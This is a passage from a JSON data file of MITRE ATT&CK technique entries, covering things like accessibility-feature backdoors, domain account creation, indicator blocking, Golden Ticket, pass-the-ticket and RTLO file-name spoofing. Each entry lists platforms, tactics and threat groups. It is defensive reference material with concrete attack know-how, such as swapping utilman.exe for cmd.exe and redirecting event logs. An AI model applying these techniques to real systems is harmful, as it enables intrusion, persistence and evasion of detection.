Spider","TeamTNT","APT41","GALLIUM","Kimsuky","Darkhotel","HAFNIUM","APT32","Higaisa","OilRig","Earth Lusca","ZIRCONIUM","Sandworm Team","Operation Wocao","Frankenstein","Dragonfly 2.0"]},"T1578.003":{"id":"T1578.003","name":"Delete Cloud Instance","description":"An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.\n\nAn adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.^[[1]](https://content.fireeye.com/m-trends/rpt-m-trends-2020)^","platforms":["IaaS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["LAPSUS$"]},"T1593.003":{"id":"T1593.003","name":"Code Repositories","description":"Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  \n\nAdversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.^[[1]](https://www.forbes.com/sites/runasandvik/2014/01/14/attackers-scrape-github-for-cloud-service-credentials-hijack-account-to-mine-virtual-currency/)^ Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)). \n\n**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003), which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from private and internally hosted code repositories. ","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["LAPSUS$"]},"T1574.005":{"id":"T1574.005","name":"Executable Installer File Permissions Weakness","description":"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the `%TEMP%` directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.^[[1]](https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/)^  ^[[2]](https://seclists.org/fulldisclosure/2015/Dec/34)^ If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":[]},"T1546.008":{"id":"T1546.008","name":"Accessibility Features","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are `C:\\Windows\\System32\\sethc.exe`, launched when the shift key is pressed five times and `C:\\Windows\\System32\\utilman.exe`, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. ^[[1]](https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html)^\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in `%systemdir%\\`, and it must be protected by Windows File or Resource Protection (WFP/WRP). ^[[2]](https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom)^ The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., `C:\\Windows\\System32\\utilman.exe`) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. ^[[3]](http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/)^\n\nOther accessibility features exist that may also be leveraged in a similar fashion: ^[[2]](https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom)^^[[4]](https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html)^\n\n* On-Screen Keyboard: `C:\\Windows\\System32\\osk.exe`\n* Magnifier: `C:\\Windows\\System32\\Magnify.exe`\n* Narrator: `C:\\Windows\\System32\\Narrator.exe`\n* Display Switcher: `C:\\Windows\\System32\\DisplaySwitch.exe`\n* App Switcher: `C:\\Windows\\System32\\AtBroker.exe`","platforms":["Windows"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":["APT41","APT3","Deep Panda","Axiom","Fox Kitten","APT29"]},"T1087":{"id":"T1087","name":"Account Discovery","description":"Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace"],"tactics":["Discovery"],"campaigns":["SolarWinds Compromise"],"groups":["FIN13","APT29","UNC2452","APT32"]},"T1090":{"id":"T1090","name":"Proxy","description":"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. ^[[1]](http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/)^ Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.","platforms":["Linux","macOS","Windows","Network"],"tactics":["Command and Control"],"campaigns":["C0017","Operation Wocao","C0027","Operation Sharpshooter"],"groups":["Volt Typhoon","Sandworm Team","Turla","CopyKittens","LAPSUS$","Blue Mockingbird","MoustachedBouncer","Windigo","POLONIUM","Fox Kitten","Earth Lusca","Magic Hound","APT41","Operation Wocao","Wizard Spider"]},"T1059":{"id":"T1059","name":"Command and Scripting Interpreter","description":"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.^[[1]](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1)^^[[2]](https://tools.cisco.com/security/center/resources/integrity_assurance.html#23)^^[[3]](https://www.thepythoncode.com/article/executing-bash-commands-remotely-in-python)^","platforms":["Linux","macOS","Windows","Network","Office 365","Azure AD","IaaS","Google Workspace"],"tactics":["Execution"],"campaigns":["Operation Spalax"],"groups":["Fox Kitten","Stealth Falcon","FIN7","FIN6","FIN5","APT19","APT32","Dragonfly","Whitefly","APT39","Ke3chang","APT37","Windigo","OilRig","Dragonfly 2.0","Molerats","BRONZE BUTLER","Honeybee","APT28","FIN8","APT1","Lazarus Group","Cobalt Group","APT34"]},"T1562.006":{"id":"T1562.006","name":"Indicator Blocking","description":"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting^[[1]](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=Backdoor:Win32/Lamin.A)^ or even disabling host-based sensors, such as Event Tracing for Windows (ETW)^[[2]](https://docs.microsoft.com/en-us/windows/desktop/etw/consuming-events)^, by tampering settings that control the collection and flow of event telemetry.^[[3]](https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63)^ These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nFor example, adversaries may modify the `File` value in `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security` to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.^[[4]](https://ptylu.github.io/content/report/report.html?report=25)^ \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) `Set-EtwTraceProvider` cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors ^[[5]](https://www.crowdstrike.com/blog/lemonduck-botnet-targets-docker-for-cryptomining-operations/)^.","platforms":["Windows","macOS","Linux"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1136.002":{"id":"T1136.002","name":"Domain Account","description":"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the `net user /add /domain` command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.","platforms":["Windows","macOS","Linux"],"tactics":["Persistence"],"campaigns":["2015 Ukraine Electric Power Attack","2016 Ukraine Electric Power Attack"],"groups":["GALLIUM","Wizard Spider","HAFNIUM","Sandworm Team"]},"T1589.003":{"id":"T1589.003","name":"Employee Names","description":"Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.\n\nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).^[[1]](https://www.opm.gov/cybersecurity/cybersecurity-incidents/)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Kimsuky","Sandworm Team","Silent Librarian"]},"T1482":{"id":"T1482","name":"Domain Trust Discovery","description":"Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.^[[1]](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10))^ Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).^[[2]](https://adsecurity.org/?p=1588)^^[[3]](https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944)^ Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.^[[3]](https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944)^ The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.^[[4]](https://www.microsoft.com/security/blog/2017/05/04/windows-defender-atp-thwarts-operation-wilysupply-software-supply-chain-cyberattack/)^","platforms":["Windows"],"tactics":["Discovery"],"campaigns":["SolarWinds Compromise","C0015"],"groups":["Chimera","Earth Lusca","Magic Hound","FIN8","APT29","UNC2452","Wizard Spider"]},"T1558.001":{"id":"T1558.001","name":"Golden Ticket","description":"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.^[[1]](https://adsecurity.org/?p=1640)^ Golden tickets enable adversaries to generate authentication material for any account in Active Directory.^[[2]](https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf)^ \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.^[[3]](https://adsecurity.org/?p=1515)^\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.^[[4]](https://adsecurity.org/?p=483)^ The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":[],"groups":["Ke3chang"]},"T1020":{"id":"T1020","name":"Automated Exfiltration","description":"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).","platforms":["Linux","macOS","Windows","Network"],"tactics":["Exfiltration"],"campaigns":["Frankenstein"],"groups":["Sidewinder","Ke3chang","Tropic Trooper","Gamaredon Group","Frankenstein","Honeybee"]},"T1592.004":{"id":"T1592.004","name":"Client Configurations","description":"Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.^[[1]](https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks)^ Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["HAFNIUM"]},"T1562.007":{"id":"T1562.007","name":"Disable or Modify Cloud Firewall","description":"Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity, or remove networking limitations to support traffic associated with malicious activity (such as cryptomining).^[[1]](https://expel.io/blog/finding-evil-in-aws/)^^[[2]](https://unit42.paloaltonetworks.com/compromised-cloud-compute-credentials/)^\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.","platforms":["IaaS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1036.002":{"id":"T1036.002","name":"Right-to-Left Override","description":"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named `March 25 \\u202Excod.scr` will display as `March 25 rcs.docx`. A JavaScript file named `photo_high_re\\u202Egnp.js` will be displayed as `photo_high_resj.png`.^[[1]](https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/)^\n\nAdversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.^[[2]](https://blog.trendmicro.com/trendlabs-security-intelligence/plead-targeted-attacks-against-taiwanese-government-agencies-2/)^^[[3]](https://securelist.com/zero-day-vulnerability-in-telegram/83800/)^ RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Ferocious Kitten","BlackTech","Ke3chang","Scarlet Mimic","BRONZE BUTLER"]},"T1588.001":{"id":"T1588.001","name":"Malware","description":"Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Night Dragon","Operation Spalax","FunnyDream","C0015"],"groups":["LuminousMoth","TA2541","LAPSUS$","Metador","APT1","Aquatic Panda","LazyScripter","Andariel","TA505","Turla","Earth Lusca","BackdoorDiplomacy"]},"T1542.002":{"id":"T1542.002","name":"Component Firmware","description":"Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.","platforms":["Windows","Linux","macOS"],"tactics":["Persistence","Defense Evasion"],"campaigns":[],"groups":["Equation"]},"T1070":{"id":"T1070","name":"Indicator Removal","description":"Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.","platforms":["Linux","macOS","Windows","Containers","Network","Office 365","Google Workspace"],"tactics":["Defense Evasion"],"campaigns":["SolarWinds Compromise"],"groups":["Lazarus Group","APT29","UNC2452","Dragonfly"]},"T1048.001":{"id":"T1048.001","name":"Exfiltration Over Symmetric Encrypted Non-C2 Protocol","description":"Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). ","platforms":["Linux","macOS","Windows"],"tactics":["Exfiltration"],"campaigns":[],"groups":[]},"T1137.001":{"id":"T1137.001","name":"Office Template Macros","description":"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. ^[[1]](https://support.office.com/article/Change-the-Normal-template-Normal-dotm-06de294b-d216-47f6-ab77-ccb5166f98ea)^\n\nOffice Visual Basic for Applications (VBA) macros ^[[2]](https://msdn.microsoft.com/en-us/vba/office-shared-vba/articles/getting-started-with-vba-in-office)^ can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.^[[3]](https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/)^^[[4]](http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/)^ Shared templates may also be stored and pulled from remote locations.^[[5]](https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique)^ \n\nWord Normal.dotm location:<br>\n`C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm`\n\nExcel Personal.xlsb location:<br>\n`C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB`\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under `C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\`, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.^[[5]](https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique)^ \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.","platforms":["Windows","Office 365"],"tactics":["Persistence"],"campaigns":[],"groups":["MuddyWater"]},"T1583.003":{"id":"T1583.003","name":"Virtual Private Server","description":"Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.^[[1]](https://documents.trendmicro.com/assets/wp/wp-criminal-hideouts-for-lease.pdf)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["LAPSUS$","Axiom","Dragonfly","TEMP.Veles","HAFNIUM"]},"T1213.001":{"id":"T1213.001","name":"Confluence","description":"\nAdversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n","platforms":["SaaS"],"tactics":["Collection"],"campaigns":[],"groups":["LAPSUS$"]},"T1550.003":{"id":"T1550.003","name":"Pass the Ticket","description":"Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.^[[1]](https://adsecurity.org/?p=556)^^[[2]](http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos)^\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).^[[1]](https://adsecurity.org/?p=556)^\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.^[[3]](http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf)^\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.^[[4]](https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/)^","platforms":["Windows"],"tactics":["Defense Evasion","Lateral Movement"],"campaigns":[],"groups":["APT29","APT32","BRONZE BUTLER"]},"T1609":{"id":"T1609","name":"Container Administration Command","description":"Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.^[[1]](https://docs.docker.com/engine/reference/commandline/dockerd/)^^[[2]](https://kubernetes.io/docs/concepts/overview/kubernetes-api/)^^[[3]](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)^\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as `docker exec` to execute a command within a running container.^[[4]](https://docs.docker.com/engine/reference/run/#entrypoint-default-command-to-execute-at-runtime)^^[[5]](https://docs.docker.com/engine/reference/commandline/exec/)^ In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as `kubectl exec`.^[[6]](https://kubernetes.io/docs/tasks/debug-application-cluster/get-shell-running-container/)^","platforms":["Containers"],"tactics":["Execution"],"campaigns":[],"groups":["TeamTNT"]},"T1083":{"id":"T1083","name":"File and Directory Discovery","description":"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include `dir`, `tree`, `ls`, `find`, and `locate`.^[[1]](https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html)^ Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. `dir`, `show flash`, and/or 